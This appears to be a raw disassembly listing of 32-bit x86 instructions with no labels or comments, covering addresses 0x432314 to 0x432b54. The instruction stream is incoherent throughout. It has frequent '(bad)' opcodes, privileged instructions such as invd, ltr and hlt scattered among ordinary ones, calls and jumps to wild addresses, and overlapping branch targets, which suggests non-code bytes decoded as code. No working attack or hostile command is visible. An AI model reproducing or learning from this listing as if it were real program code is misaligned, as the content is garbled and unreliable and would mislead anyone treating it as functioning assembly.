  432314:	pushf  
  432315:	(bad)  
  432316:	jmp    0x432324
  432318:	mov    eax,edi
  43231a:	or     al,0x75
  43231c:	inc    eax
  43231d:	call   0x431a25
  432322:	mov    eax,eax
  432324:	loopne 0x4322aa
  432326:	inc    ebp
  432327:	add    BYTE PTR [ebx+0x1451c00],cl
  43232d:	mov    eax,DWORD PTR [ebp+0x20]
  432330:	add    edi,ecx
  432332:	add    BYTE PTR [eax],ch
  432334:	cmp    edi,0x18
  432337:	test   DWORD PTR [ebp+0xf],esi
  43233a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432341:	jne    0x432345
  432343:	call   0xffa21e08
  432348:	leave  
  432349:	rcr    BYTE PTR [esp+eax*4],0x55
  43234d:	add    ah,ch
  43234f:	add    BYTE PTR [edi-0x48fef979],dh
  432355:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43235c:	inc    esp
  43235d:	mov    ebx,DWORD PTR [eax]
  43235f:	fcom   st(2)
  432361:	add    BYTE PTR [edi],bl
  432363:	lea    ecx,[eax-0x18]
  432366:	(bad)  
  432367:	push   DWORD PTR [ecx]
  432369:	call   0xffb570cb
  43236e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432372:	fstp   DWORD PTR [esi+ebx*8]
  432375:	push   ebp
  432376:	pop    ebp
  432377:	mov    esi,DWORD PTR [edx-0x38]
  43237a:	add    DWORD PTR [eax],0x28
  43237d:	mov    edi,DWORD PTR [ebx]
  43237f:	xor    esi,DWORD PTR [edx+0x3]
  432382:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432386:	pop    ebp
  432387:	or     al,0x4
  432389:	inc    ecx
  43238a:	push   ebp
  43238b:	(bad)  
  43238c:	in     al,dx
  43238d:	or     ah,ch
  43238f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432390:	xbegin 0xffc89986
  432396:	clc    
  432397:	adc    al,0x45
  432399:	div    BYTE PTR [edx]
  43239b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4323a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4323a8:	add    BYTE PTR [ecx+0x66],dh
  4323ab:	add    eax,DWORD PTR [ebp+0x52]
  4323ae:	adc    eax,0xffffffa0
  4323b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4323b7:	test   DWORD PTR [eax],eax
  4323b9:	clc    
  4323ba:	data16 or al,BYTE PTR [ebp+0x45]
  4323be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4323c5:	rol    BYTE PTR [ebp+0x45],1
  4323c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4323ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4323d4:	push   ebx
  4323d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4323d9:	jge    0x43240e
  4323db:	add    BYTE PTR [esi+0x4],dl
  4323de:	jne    0x432445
  4323e0:	mov    edx,0x457200
  4323e5:	jmp    0x4323a9
  4323e7:	xor    edi,DWORD PTR [ebx]
  4323e9:	pop    edi
  4323ea:	cvtdq2ps xmm7,xmm0
  4323ed:	ret    0x0
  4323f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323f6:	xor    ecx,DWORD PTR [edi]
  4323f8:	add    eax,DWORD PTR [ecx+0x3b]
  4323fb:	push   ebx
  4323fc:	rdpmc  
  4323fe:	out    0x8d,al
  432400:	add    BYTE PTR [eax],cl
  432402:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432408:	ret    0x450c
  43240b:	sbb    al,0x8b
  43240d:	cmp    eax,esi
  43240f:	or     cl,al
  432411:	or     al,0xc2
  432413:	pop    eax
  432414:	inc    ebp
  432415:	add    ecx,DWORD PTR [edi]
  432417:	add    esi,DWORD PTR [ebp+0x39]
  43241a:	invd   
  43241c:	jge    0x432428
  43241e:	mov    eax,0x478ac0
  432423:	cli    
  432424:	xor    esp,ecx
  432426:	mov    ebx,0x5b8ac0
  43242b:	ret    0x33
  43242e:	mov    eax,0x833b8b
  432433:	sub    BYTE PTR [ebx],al
  432435:	inc    ebp
  432436:	xor    ax,di
  432439:	pushf  
  43243a:	inc    bh
  43243c:	mov    esp,esp
  43243e:	hlt    
  43243f:	test   DWORD PTR [ebp-0x8],esi
  432442:	mov    eax,DWORD PTR [ebp-0x14]
  432445:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43244b:	dec    edi
  43244c:	or     BYTE PTR [eax],al
  43244e:	jne    0x4323d9
  432450:	mov    esi,esp
  432452:	call   0x77a9b017
  432457:	inc    ebp
  432458:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43245e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432464:	add    BYTE PTR [esi+0x7d],ah
  432467:	inc    ebp
  432468:	mov    bx,WORD PTR [ebp+0x8]
  43246c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432473:	inc    ebp
  432474:	mov    bx,di
  432477:	lock test BYTE PTR [ecx+0x7000801],bh
  43247e:	jge    0x432441
  432480:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432486:	cli    
  432487:	xor    bl,bh
  432489:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43248f:	test   BYTE PTR [eax],cl
  432491:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432498:	cmp    ebp,eax
  43249a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4324a1:	test   BYTE PTR [ebp+0x1],bh
  4324a4:	mov    ebx,0x458a00
  4324a9:	xor    esi,DWORD PTR [ebx]
  4324ab:	add    esp,DWORD PTR [esi-0x77]
  4324ae:	pop    ebp
  4324af:	loopne 0x432517
  4324b1:	inc    ebp
  4324b2:	clc    
  4324b3:	xor    edi,DWORD PTR [ebx]
  4324b5:	add    esi,DWORD PTR [edx-0x77]
  4324b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4324bc:	mov    ebx,0xb78afc
  4324c1:	hlt    
  4324c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4324c5:	add    BYTE PTR [ebp+0x66],bl
  4324c8:	data16 lock clc 
  4324cb:	cmp    al,0x3b
  4324cd:	add    BYTE PTR [edi+0x66],dh
  4324d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4324d4:	ltr    WORD PTR [ebp+0x66]
  4324d8:	add    esi,eax
  4324da:	add    di,WORD PTR [ebp+0x2b]
  4324de:	data16 data16 jge 0x43255f
  4324e2:	mov    ebx,0xe08a8b
  4324e7:	jge    0x43251c
  4324e9:	data16 data16 xor al,0x5d
  4324ed:	data16 data16 jne 0x4324e9
  4324f1:	mov    edi,DWORD PTR [ebx]
  4324f3:	fdiv   QWORD PTR [edx+0x7d]
  4324f6:	data16 data16 jge 0x43252e
  4324fa:	mov    ebx,0x758a66
  4324ff:	mov    esi,0x667233
  432504:	pop    ebp
  432505:	or     BYTE PTR [esi+0x0],ah
  432508:	clc    
  432509:	mov    edi,DWORD PTR [ebx]
  43250b:	lock ja 0x432499
  43250e:	(bad)  
  432510:	jge    0x432509
  432512:	invd   
  432514:	pop    ebp
  432515:	add    BYTE PTR [ebx],al
  432517:	(bad)  
  432518:	cmp    di,WORD PTR [ebp+0xf]
  43251c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432520:	mov    bx,WORD PTR [ebp-0x10]
  432524:	pop    bp
  432526:	fbstp  TBYTE PTR [ebx]
  432528:	test   DWORD PTR [ebx],eax
  43252a:	add    BYTE PTR [ebx],bh
  43252c:	add    BYTE PTR [esi+0x7d],ah
  43252f:	jge    0x4324bc
  432531:	data16 in al,dx
  432533:	pop    ebp
  432534:	stc    
  432535:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43253c:	mov    edi,ebx
  43253e:	in     al,dx
  43253f:	test   BYTE PTR [ebp+0x0],bh
  432542:	mov    eax,DWORD PTR [eax]
  432544:	call   0xbd401ed4
  432549:	cmp    al,0x9b
  43254b:	add    BYTE PTR [edx],dh
  43254d:	mov    bx,di
  432550:	call   0x8b4ba2e0
  432555:	add    ebp,esp
  432557:	mov    bx,di
  43255a:	jnp    0x432582
  43255c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432562:	mov    eax,DWORD PTR [eax]
  432564:	call   0x7c3eb0cf
  432569:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43256f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432574:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43257e:	fisttp WORD PTR [ecx-0x7401f77b]
  432584:	(bad)  
  432585:	cld    
  432586:	jne    0x4325c4
  432588:	xor    eax,DWORD PTR [eax]
  43258a:	mov    esp,DWORD PTR [esi-0x10]
  43258d:	sti    
  43258e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432595:	data16 adc bl,bh
  432598:	push   ebp
  432599:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4325a0:	mov    WORD PTR [eax],es
  4325a2:	fwait
  4325a3:	data16 xor bh,bl
  4325a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4325ac:	mov    esp,DWORD PTR [esi-0x14]
  4325af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4325b5:	or     al,0x2b
  4325b7:	mov    bh,0xba
  4325b9:	hlt    
  4325ba:	mov    bh,bl
  4325bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4325c2:	dec    esi
  4325c3:	or     al,0x0
  4325c5:	mov    edi,DWORD PTR [ebx]
  4325c7:	or     BYTE PTR [ebp+0x3b],dh
  4325ca:	mov    ecx,DWORD PTR [edi]
  4325cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4325d2:	xor    al,0xd8
  4325d4:	pop    bp
  4325d6:	lock xor esi,DWORD PTR [ebx]
  4325d9:	lea    esp,[esi+0x1f]
  4325dc:	icebp  
  4325dd:	jb     0x4325e3
  4325df:	add    al,al
  4325e1:	jge    0x4325ef
  4325e3:	mov    eax,eax
  4325e5:	fsubr  st,st(3)
  4325e7:	pop    ebp
  4325e8:	mov    esi,DWORD PTR [ebx]
  4325ea:	in     al,0x8d
  4325ec:	rcr    DWORD PTR [edi],0xc2
  4325ef:	jb     0x43264f
  4325f1:	add    cl,cl
  4325f3:	jge    0x432601
  4325f5:	mov    edx,DWORD PTR [ebp-0x20]
  4325f8:	in     al,dx
  4325f9:	pop    ebp
  4325fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325ff:	cmp    di,WORD PTR [ebp+0x0]
  432603:	mov    ebp,DWORD PTR [ebx]
  432605:	fdivr  QWORD PTR [esi+0x668a5d]
  43260b:	cmp    al,0x33
  43260d:	mov    si,0x4e7d
  432611:	mov    eax,DWORD PTR [eax]
  432613:	lock inc ebp
  432615:	mov    esi,DWORD PTR [eax]
  432617:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43261e:	clc    
  43261f:	(bad)  
  432620:	cmp    edi,DWORD PTR [ebx]
  432622:	je     0x432633
  432624:	push   ebx
  432625:	loopne 0x432636
  432627:	dec    ecx
  432629:	mov    esp,DWORD PTR [ebp-0x1c]
  43262c:	int    0xf1
  43262e:	mov    esi,0x703084d
  432633:	pcmpgtd mm6,mm1
  432636:	add    BYTE PTR [ebp+0x66],dh
  432639:	jmp    0x432606
  43263b:	mov    eax,DWORD PTR [ebx]
  43263d:	lock push ebp
  43263f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432645:	or     bh,dl
  432647:	jb     0x432647
  432649:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43264f:	loopne 0x432651
  432651:	jne    0x432655
  432653:	data16 add BYTE PTR [esi+eiz*2],dh
  432657:	mov    ecx,ebx
  432659:	data16 cmp al,0xf1
  43265c:	add    BYTE PTR [esi+eiz*2],bh
  43265f:	add    bl,cl
  432661:	retw   0xf2
  432665:	ret    0x66
  432668:	retf   
  432669:	enterw 0x4df1,0x19
  43266e:	pop    edi
  43266f:	jne    0x4325f2
  432671:	mov    esi,DWORD PTR [eax]
  432673:	call   0x77b7b214
  432678:	xor    ebp,DWORD PTR [ebx]
  43267a:	lea    esp,[esi+0x48]
  43267d:	repnz in eax,0x3b
  432680:	add    BYTE PTR [ebp-0x37],dh
  432683:	xor    edx,DWORD PTR [ebp-0x15]
  432686:	in     al,dx
  432687:	xor    edx,DWORD PTR [esi+0x40]
  43268a:	mov    DWORD PTR [edi],0x338545fc
  432690:	clc    
  432691:	add    esi,DWORD PTR [ecx]
  432693:	pop    edi
  432694:	pushf  
  432695:	pop    ebx
  432696:	call   0xff44265d
  43269b:	mov    edi,eax
  43269d:	push   ecx
  43269e:	pop    es
  43269f:	mov    edi,DWORD PTR [eax]
  4326a1:	push   esi
  4326a2:	inc    esi
  4326a3:	add    bh,BYTE PTR [esi+0x0]
  4326a6:	popa   
  4326a7:	data16 (bad) 
  4326a9:	into   
  4326aa:	gs cmp al,0xcd
  4326ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4326b3:	ret    0x66
  4326b6:	add    bh,al
  4326b8:	add    bh,ah
  4326ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4326c0:	cmp    al,0x9c
  4326c2:	add    BYTE PTR [esi+0x66],ah
  4326c5:	into   
  4326c6:	ret    
  4326c7:	pop    ebp
  4326c8:	adc    BYTE PTR [edi+0x0],dl
  4326cb:	mov    bh,0x66
  4326cd:	mov    edi,0xff038dc3
  4326d2:	jne    0x432728
  4326d4:	lea    edx,[ecx+0x1]
  4326d7:	mov    ebx,0xd64ff1
  4326dc:	sar    DWORD PTR [ebx],1
  4326de:	test   BYTE PTR [ebp+0x36],dh
  4326e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326e5:	push   edi
  4326e6:	xor    BYTE PTR [ebx],0x38
  4326e9:	mov    esi,ebx
  4326eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4326f1:	ss inc ebp
  4326f3:	fs pop ebx
  4326f5:	mov    ebx,0x9c3b30
  4326fa:	je     0x432727
  4326fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432702:	mov    WORD PTR [ebx],?
  432704:	ss mov ebx,0x8b4e64
  43270a:	pop    edi
  43270b:	cmp    ecx,ecx
  43270d:	jne    0x432764
  43270f:	mov    ebp,esp
  432711:	cld    
  432712:	push   esi
  432713:	pop    ebx
  432714:	inc    ebp
  432715:	stc    
  432716:	xor    BYTE PTR [ebp+0x9bef89c],al
  43271c:	test   esi,ecx
  43271e:	clc    
  43271f:	test   dl,dl
  432721:	cmp    bh,bh
  432723:	fs pop si
  432726:	or     bl,al
  432728:	add    cl,BYTE PTR [ebx+0x57665100]
  43272e:	retf   0x3c45
  432731:	xor    BYTE PTR [eax],al
  432733:	pushf  
  432734:	mov    si,0x85ca
  432738:	ret    0xf8
  43273b:	pop    ebx
  43273c:	dec    dx
  43273f:	mov    edx,DWORD PTR [edi-0x76]
  432742:	push   edi
  432743:	add    al,0xb7
  432745:	xor    al,0xba
  432747:	cmp    al,0x8d
  432749:	je     0x43274a
  43274b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43274f:	lea    edi,[ebx+0x544fff]
  432755:	push   ecx
  432756:	cmp    edx,DWORD PTR [ebx+0x75]
  432759:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43275f:	add    BYTE PTR [ebx],dh
  432761:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432767:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43276e:	mov    ebx,0x3b3b00
  432773:	jne    0x4327a0
  432775:	mov    DWORD PTR [ebx+0x728afc],edi
  43277b:	xor    esi,DWORD PTR [ebx]
  43277d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432783:	push   edi
  432784:	cmp    esp,ebp
  432786:	jne    0x432788
  432788:	sbb    DWORD PTR [eax],0x8085c3fc
  43278e:	clc    
  43278f:	inc    esi
  432790:	pop    ebx
  432791:	sti    
  432792:	add    eax,0xeb8bc075
  432797:	cld    
  432798:	xor    edi,DWORD PTR ds:0xf8c3855e
  43279e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4327a1:	rol    DWORD PTR [ebp-0x37],0xf
  4327a5:	mov    DWORD PTR [eax],ecx
  4327a7:	inc    edi
  4327a8:	(bad)  
  4327a9:	in     eax,0xfe
  4327ab:	add    bh,bh
  4327ad:	(bad)  
  4327ae:	mov    esi,0xc38a5e
  4327b3:	mov    esi,DWORD PTR [ebx]
  4327b5:	push   ecx
  4327b6:	mov    edi,0xfc4ec7
  4327bb:	test   DWORD PTR [ebp-0x8],edx
  4327be:	xor    di,ax
  4327c1:	pushf  
  4327c2:	sub    ebp,eax
  4327c4:	inc    ebp
  4327c5:	(bad)  
  4327c6:	sub    edi,edi
  4327c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4327ce:	inc    ebp
  4327cf:	add    BYTE PTR [esi+0x2b],ah
  4327d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4327d8:	cmp    al,0x33
  4327da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4327e0:	(bad)  
  4327e1:	cmp    esi,DWORD PTR [ebx]
  4327e3:	je     0x43279d
  4327e5:	push   ebx
  4327e6:	dec    esi
  4327e7:	str    ecx
  4327ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4327ed:	int    0x33
  4327ef:	mov    edi,0x789085f
  4327f4:	mov    edx,DWORD PTR [eax]
  4327f6:	cld    
  4327f7:	add    cl,cl
  4327f9:	data16 add al,0xcb
  4327fc:	push   ebp
  4327fd:	add    ebp,esp
  4327ff:	jne    0x4327ed
  432801:	(bad)  
  432802:	mov    DWORD PTR [ecx],0xd685f7ec
  432808:	clc    
  432809:	xlat   BYTE PTR ds:[ebx]
  43280a:	inc    ebp
  43280b:	mov    esi,DWORD PTR [edx]
  43280d:	push   eax
  43280e:	pushf  
  43280f:	in     eax,0x8b
  432811:	add    ah,ch
  432813:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432817:	add    ax,0x72cb
  43281b:	cmp    al,0x0
  43281d:	add    BYTE PTR [ebp+0x66],al
  432820:	(bad)  
  432821:	retf   
  432822:	lock ret 0x85
  432826:	clc    
  432827:	inc    bp
  432829:	retf   
  43282a:	cmp    eax,0xc77d9cc8
  43282f:	xor    ah,bh
  432831:	pushf  
  432832:	test   DWORD PTR [edi-0x8],ebx
  432835:	je     0x43287c
  432837:	xor    esi,DWORD PTR ds:0x7020840
  43283d:	ror    BYTE PTR [ebp-0x37],0x8d
  432841:	push   ebp
  432842:	add    esp,ebp
  432844:	jb     0x4327d1
  432846:	add    BYTE PTR [eax],cl
  432848:	dec    ebp
  432849:	mov    bh,0x81
  43284b:	push   esi
  43284c:	push   esp
  43284d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432854:	xor    al,BYTE PTR [eax]
  432856:	mov    edx,DWORD PTR [edi+0x10]
  432859:	(bad)  
  43285a:	scas   eax,DWORD PTR es:[edi]
  43285b:	ret    0x3b
  43285e:	jns    0x3b442551
  432864:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432868:	dec    ebp
  432869:	or     BYTE PTR [ebx],ch
  43286b:	ret    0x458b
  43286e:	lock jmp 0x432862
  432871:	mov    ecx,DWORD PTR [eax]
  432873:	or     BYTE PTR [edi],al
  432875:	mov    ecx,eax
  432877:	xor    DWORD PTR [edx+0x2],0x0
  43287b:	mov    bh,0xc1
  43287d:	adc    BYTE PTR [eax],dh
  43287f:	iret   
  432880:	inc    ebp
  432881:	mov    DWORD PTR [ebx],0x4dfff8c4
  432887:	inc    BYTE PTR [ebx]
  432889:	ret    0xf8
  43288c:	adc    DWORD PTR [esi+0x10],esp
  43288f:	clc    
  432890:	dec    ecx
  432891:	fisttp WORD PTR [ecx+0x456604c0]
  432897:	add    dh,BYTE PTR ds:0x75e0845
  43289d:	ret    0x4d
  4328a0:	lea    ecx,[ebx+0x18728301]
  4328a6:	add    BYTE PTR [ebp+0x45],al
  4328a9:	xor    ecx,ebp
  4328ab:	pushf  
  4328ac:	add    bh,al
  4328ae:	add    al,ch
  4328b0:	inc    ebp
  4328b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4328b7:	xor    eax,0x781084d
  4328bc:	push   esp
  4328bd:	fwait
  4328be:	push   ecx
  4328bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4328c5:	inc    ebp
  4328c6:	cmp    edi,DWORD PTR [ecx]
  4328c8:	jbe    0x432866
  4328ca:	mov    eax,edi
  4328cc:	or     ah,dh
  4328ce:	inc    ebp
  4328cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4328d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4328db:	in     al,dx
  4328dc:	hlt    
  4328dd:	push   esp
  4328de:	push   esp
  4328df:	push   ecx
  4328e0:	push   ecx
  4328e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328e7:	fwait
  4328e8:	fwait
  4328e9:	xor    dh,BYTE PTR [edx]
  4328eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4328f1:	or     BYTE PTR [ebp+0x7],al
  4328f4:	mov    eax,ecx
  4328f6:	clc    
  4328f7:	jb     0x4328ba
  4328f9:	add    BYTE PTR [ebp+0x55],cl
  4328fc:	or     DWORD PTR [edi],0xc251d154
  432902:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43290c:	mov    edi,eax
  43290e:	or     cl,al
  432910:	inc    ebp
  432911:	dec    ebp
  432912:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432918:	or     WORD PTR [ecx],0x899b
  43291d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432923:	mov    edx,DWORD PTR [ecx+0x8]
  432926:	mov    eax,DWORD PTR [ebp-0x8]
  432929:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432930:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432936:	inc    ebp
  432937:	dec    eax
  432938:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  43293e:	add    edx,DWORD PTR [ecx-0x8]
  432941:	mov    ecx,DWORD PTR [ecx]
  432943:	clc    
  432944:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  43294b:	mov    ecx,ebp
  43294d:	clc    
  43294e:	(bad)  
  43294f:	popf   
  432950:	inc    DWORD PTR [eax]
  432952:	ret    0x8b
  432955:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43295b:	mov    edi,esp
  43295d:	hlt    
  43295e:	test   ecx,esi
  432960:	clc    
  432961:	or     BYTE PTR [ebp+0x7],al
  432964:	xor    al,cl
  432966:	pushf  
  432967:	jb     0x43299c
  432969:	add    BYTE PTR [eax-0x3f],al
  43296c:	inc    eax
  43296d:	daa    
  43296e:	inc    ebp
  43296f:	inc    ebp
  432970:	xor    eax,0x7f80803
  432975:	dec    ebp
  432976:	fwait
  432977:	add    esi,DWORD PTR [edx]
  432979:	clc    
  43297a:	cmp    DWORD PTR [ecx],ecx
  43297c:	or     al,0x8
  43297e:	add    al,BYTE PTR [ebp+0x2c]
  432981:	xor    eax,0x7350845
  432986:	or     BYTE PTR [ebp+0x7],cl
  432989:	lea    ebx,[ebx-0x748dcdff]
  43298f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432996:	mov    edx,DWORD PTR [eax]
  432998:	cld    
  432999:	dec    ebp
  43299a:	push   esp
  43299b:	sub    edx,DWORD PTR [ecx-0x75]
  43299e:	add    eax,0xf172fc
  4329a3:	or     BYTE PTR [ebp+0x7],cl
  4329a6:	add    eax,ecx
  4329a8:	or     al,0x72
  4329aa:	add    DWORD PTR [eax],eax
  4329ac:	mov    ebx,0x29c2c1
  4329b1:	inc    ebp
  4329b2:	mov    eax,DWORD PTR [ebx]
  4329b4:	cmp    eax,0x3004d1c
  4329ba:	xbegin 0x66c8b5b4
  4329c0:	clc    
  4329c1:	or     BYTE PTR [ebp+0x45],al
  4329c4:	xor    dh,BYTE PTR ds:0x78b089c
  4329ca:	adc    BYTE PTR [ebp+0x45],cl
  4329cd:	lea    eax,[ebp+0x33727501]
  4329d3:	add    cl,ch
  4329d5:	inc    ebp
  4329d6:	add    bl,ch
  4329d8:	add    BYTE PTR [ebx+0x45850845],cl
  4329de:	je     0x43296b
  4329e0:	push   ebx
  4329e1:	or     al,0x85
  4329e3:	dec    ebp
  4329e4:	std    
  4329e5:	mov    bh,bh
  4329e7:	mov    BYTE PTR [ebp-0x75],al
  4329ea:	mov    edi,eax
  4329ec:	or     al,0x89
  4329ee:	inc    ebp
  4329ef:	clc    
  4329f0:	mov    esp,esp
  4329f2:	hlt    
  4329f3:	call   DWORD PTR [edi-0x37]
  4329f6:	push   esp
  4329f7:	or     al,0x51
  4329f9:	push   ebp
  4329fa:	xor    ebp,esp
  4329fc:	mov    esi,0x457251
  432a01:	xor    esi,eax
  432a03:	pushf  
  432a04:	inc    ebp
  432a05:	(bad)  
  432a06:	mov    edi,eax
  432a08:	or     al,0x85
  432a0a:	add    al,bh
  432a0c:	inc    eax
  432a0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a12:	or     ah,bh
  432a14:	inc    eax
  432a15:	push   esp
  432a16:	jmp    0x432a69
  432a18:	mov    eax,DWORD PTR ds:0xe8720c
  432a1e:	mov    DWORD PTR [ebp-0x8],eax
  432a21:	jne    0x432a68
  432a23:	jmp    0x4329b0
  432a25:	mov    ebp,DWORD PTR [eax]
  432a27:	clc    
  432a28:	retf   0xff54
  432a2b:	push   ecx
  432a2c:	mov    DWORD PTR ds:0x757210,eax
  432a32:	mov    ecx,DWORD PTR [ebp-0x4]
  432a35:	sub    esp,DWORD PTR [ebx-0x77]
  432a38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a3f:	or     ah,bh
  432a41:	pop    es
  432a42:	ds fwait
  432a44:	push   DWORD PTR [edx]
  432a46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432a4c:	(bad)  
  432a4d:	mov    bh,bh
  432a4f:	jmp    0x432a3d
  432a51:	leave  
  432a52:	jne    0x432a5c
  432a54:	call   0x3023ae
  432a59:	in     al,dx
  432a5a:	dec    ebp
  432a5b:	add    dh,BYTE PTR [ebx]
  432a5d:	add    BYTE PTR [ebx],al
  432a5f:	inc    ebp
  432a60:	cmp    esi,DWORD PTR [ecx]
  432a62:	je     0x432a00
  432a64:	mov    eax,edi
  432a66:	or     al,0xf0
  432a68:	add    BYTE PTR [ebp+0x458bf845],al
  432a6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a74:	adc    al,0x7
  432a76:	enter  0x9fc0,0xa5
  432a7a:	rol    BYTE PTR [eax],0x5e
  432a7d:	mov    ecx,ecx
  432a7f:	or     al,0xc
  432a81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a88:	jmp    0x432a89
  432a8a:	push   ebp
  432a8b:	mov    esp,ebp
  432a8d:	cld    
  432a8e:	inc    ebp
  432a8f:	inc    ebp
  432a90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a97:	push   esi
  432a98:	push   esi
  432a99:	mov    edi,0x7af080f
  432a9e:	add    bh,al
  432aa0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432aa6:	add    BYTE PTR [ecx+0x4540100f],cl
  432aac:	mov    ebp,eax
  432aae:	mov    ebp,edi
  432ab0:	lock call edx
  432ab3:	fcom   DWORD PTR [ebp+0x45]
  432ab6:	mov    eax,0x148a8b
  432abb:	push   ecx
  432abc:	enter  0xc145,0x83
  432ac0:	cmp    ecx,DWORD PTR [eax]
  432ac2:	add    BYTE PTR [ebp+0x4d],al
  432ac5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432acb:	call   0xffa3263a
  432ad0:	cmp    eax,DWORD PTR [ebp-0xc]
  432ad3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432ad7:	push   ebp
  432ad8:	(bad)  
  432ad9:	call   0x3428dd
  432ade:	mov    bh,0xdb
  432ae0:	cld    
  432ae1:	or     BYTE PTR [ebp+0x45],bl
  432ae4:	(bad)  
  432ae5:	call   0xff7d2775
  432aea:	add    al,BYTE PTR [ebp+0x37]
  432aed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432af3:	jne    0x432af5
  432af5:	(bad)  
  432af6:	cmp    edi,esp
  432af8:	jne    0x432b2b
  432afa:	mov    edi,edi
  432afc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b02:	pop    ds
  432b03:	into   
  432b04:	je     0x432ac7
  432b06:	mov    ebx,DWORD PTR [esi]
  432b08:	or     BYTE PTR [ebp-0x49],al
  432b0b:	mov    esp,DWORD PTR [esi-0x77]
  432b0e:	mov    esi,0x2451f0c
  432b13:	mov    eax,DWORD PTR [eax]
  432b15:	or     al,0x66
  432b17:	sar    bl,0x3b
  432b1a:	xor    esi,DWORD PTR [ebp+0x66]
  432b1d:	xor    ecx,edi
  432b1f:	pop    edi
  432b20:	adc    bl,BYTE PTR [ebx+0x7e]
  432b23:	ret    0xff
  432b26:	cld    
  432b27:	inc    ebp
  432b28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432b2e:	cld    
  432b2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432b36:	push   0xffffff83
  432b38:	pop    edi
  432b39:	or     BYTE PTR [ebp+0x53],dh
  432b3c:	xorps  xmm1,xmm2
  432b3f:	test   BYTE PTR [eax+eax*1],bh
  432b42:	add    BYTE PTR [eax],al
  432b44:	adc    eax,eax
  432b46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432b4e:	jmp    DWORD PTR [eax]
  432b50:	ror    al,0x5e
  432b53:	inc    ebp
  432b54:	leave  
